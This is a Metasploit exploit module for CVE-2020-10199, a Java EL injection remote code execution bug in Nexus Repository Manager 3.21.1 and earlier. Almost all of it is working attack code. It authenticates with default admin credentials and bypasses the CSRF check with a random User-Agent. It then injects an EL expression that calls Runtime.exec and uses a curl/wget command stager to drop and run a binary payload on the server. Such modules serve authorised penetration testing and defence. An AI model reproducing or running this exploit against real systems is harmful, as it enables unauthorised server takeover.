# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Nexus Repository Manager Java EL Injection RCE&#039;,
      &#039;Description&#039;     => %q{
        Repository Manager versions up to and including 3.21.1 to execute code
        as the Nexus user. Tested against 3.21.1-01.
      },
      &#039;Author&#039;          => [
        &#039;Alvaro MuÃ±oz&#039;, # Discovery
        &#039;wvu&#039;           # Module
      ],
      &#039;References&#039;      => [
        [&#039;CVE&#039;, &#039;2020-10199&#039;],
        [&#039;URL&#039;, &#039;https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype&#039;],
        [&#039;URL&#039;, &#039;https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31&#039;]
      ],
      &#039;DisclosureDate&#039;  => &#039;2020-03-31&#039;, # Vendor advisory
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        => &#039;linux&#039;,
      &#039;Arch&#039;            => [ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;      => false,
      &#039;Targets&#039;         => [[&#039;Nexus Repository Manager <= 3.21.1&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0,
      &#039;CmdStagerFlavor&#039; => %i[curl wget],
      &#039;Notes&#039;           => {
        &#039;Stability&#039;     => [CRASH_SAFE],
        &#039;Reliability&#039;   => [REPEATABLE_SESSION],
        &#039;SideEffects&#039;   => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      Opt::RPORT(8081),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path&#039;, &#039;/&#039;]),
      OptString.new(&#039;USERNAME&#039;,  [true, &#039;Nexus username&#039;, &#039;admin&#039;]),
      OptString.new(&#039;PASSWORD&#039;,  [true, &#039;Nexus password&#039;, &#039;admin&#039;])
    ])
  end

  def post_auth?
    # Pre-auth RCE? https://twitter.com/iamnoooob/status/1246182773427240967
    true
  end

  # Send a GET / request to the server, check the response for a Server header
  # containing the Nexus version, and then check if it&#039;s a vulnerable version
  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path)
    )

    unless res
      return CheckCode::Unknown(&#039;Target did not respond to check request.&#039;)
    end

    unless res.headers[&#039;Server&#039;]
      return CheckCode::Unknown(&#039;Target did not respond with Server header.&#039;)
    end

    # Example Server header:
    # Server: Nexus/3.21.1-01 (OSS)
    version = res.headers[&#039;Server&#039;].scan(%r{^Nexus/([\d.-]+)}).flatten.first

    unless version
      return CheckCode::Unknown(&#039;Target did not respond with Nexus version.&#039;)
    end

    if Gem::Version.new(version) <= Gem::Version.new(&#039;3.21.1&#039;)
      return CheckCode::Appears("Nexus #{version} is a vulnerable version.")
    end

    CheckCode::Safe("Nexus #{version} is NOT a vulnerable version.")
  end

  def exploit
    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    print_status("Executing command stager for #{datastore[&#039;PAYLOAD&#039;]}")

    # This will drop a binary payload to disk and execute it!
    execute_cmdstager(
      noconcat: true,
      cookie:   login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
    )
  end

  def login(username, password)
    print_status("Logging in with #{username}:#{password}")

    res = send_request_cgi({
      &#039;method&#039;     => &#039;POST&#039;,
      &#039;uri&#039;        => normalize_uri(target_uri.path,
                                    &#039;/service/rapture/session&#039;),
      &#039;vars_post&#039;  => {
        &#039;username&#039; => Rex::Text.encode_base64(username),
        &#039;password&#039; => Rex::Text.encode_base64(password)
      },
      &#039;partial&#039;    => true # XXX: Return partial response despite timeout
    }, 3.5)

    unless res
      fail_with(Failure::Unknown, &#039;Target did not respond to login request&#039;)
    end

    cookie = res.get_cookies

    unless res.code == 204 && cookie.match(/NXSESSIONID=[\h-]+/)
      fail_with(Failure::NoAccess, &#039;Could not log in with specified creds&#039;)
    end

    print_good("Logged in with #{cookie}")
    cookie
  end

  # This is defined so that CmdStager can use it!
  def execute_command(cmd, opts = {})
    vprint_status("Executing command: #{cmd}")

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path,
                                &#039;/service/rest/beta/repositories/go/group&#039;),
      # HACK: Bypass CSRF token with random User-Agent header
      &#039;agent&#039;  => rand_text_english(8..42),
      &#039;cookie&#039; => opts[:cookie],
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => json_payload(cmd)
    )

    unless res
      fail_with(Failure::Unknown, &#039;Target did not respond to payload request&#039;)
    end

    unless res.code == 400 && res.body.match(/java\.lang\.UNIXProcess@\h+/)
      fail_with(Failure::PayloadFailed, "Could not execute command: #{cmd}")
    end

    print_good("Successfully executed command: #{cmd}")
  end

  # PoC based off API docs for /service/rest/beta/repositories/go/group:
  # http://localhost:8081/#admin/system/api
  def json_payload(cmd)
    {
      &#039;name&#039;                          => &#039;internal&#039;,
      &#039;online&#039;                        => true,
      &#039;storage&#039;                       => {
        &#039;blobStoreName&#039;               => &#039;default&#039;,
        &#039;strictContentTypeValidation&#039; => true
      },
      &#039;group&#039;                         => {
        # XXX: memberNames has to be an array, but the API example was a string
        &#039;memberNames&#039;                 => [el_payload(cmd)]
      }
    }.to_json
  end

  # Helpful resource from which I borrowed the EL payload:
  # https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf
  def el_payload(cmd)
    el = <<~EOF.gsub(/\s+/, &#039;&#039;)
      ${
        "".getClass().forName("java.lang.Runtime").getMethods()[6].invoke(
          "".getClass().forName("java.lang.Runtime")
        ).exec("PATCH_ME")
      }
    EOF

    # Patch in our command, escaping any double quotes
    el.sub(&#039;PATCH_ME&#039;, cmd.gsub(&#039;"&#039;, &#039;\\"&#039;))
  end

end

